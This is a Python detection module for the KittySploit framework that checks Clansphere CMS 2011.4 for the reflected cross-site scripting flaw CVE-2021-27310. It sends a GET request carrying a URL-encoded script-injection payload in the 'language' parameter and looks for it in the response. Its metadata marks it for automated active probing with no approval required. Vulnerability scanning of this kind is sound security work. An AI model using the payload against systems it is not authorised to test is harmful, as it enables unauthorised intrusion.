#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Clansphere CMS 2011."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Clansphere CMS 2011.4 - Cross-Site Scripting Detection',
        'description': 'Clansphere CMS 2011.4 contains an unauthenticated reflected cross-site scripting vulnerability via the "language" parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'xss', 'clansphere', 'csphere', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/xoffense/POC/blob/main/Clansphere%202011.4%20%22language%22%20xss.md',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27310',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-27310',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2021-27310',
    }

    def run(self):
        r = self.http_request(method="GET", path='/clansphere/mods/clansphere/lang_modvalidate.php?language=language%27%22()%26%25%3Cyes%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&module=module', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('</script><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Clansphere CMS 2011.4 - Cross-Site Scripting detected",
                path='/clansphere/mods/clansphere/lang_modvalidate.php?language=language%27%22()%26%25%3Cyes%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&module=module',
            )
            return True
        return False

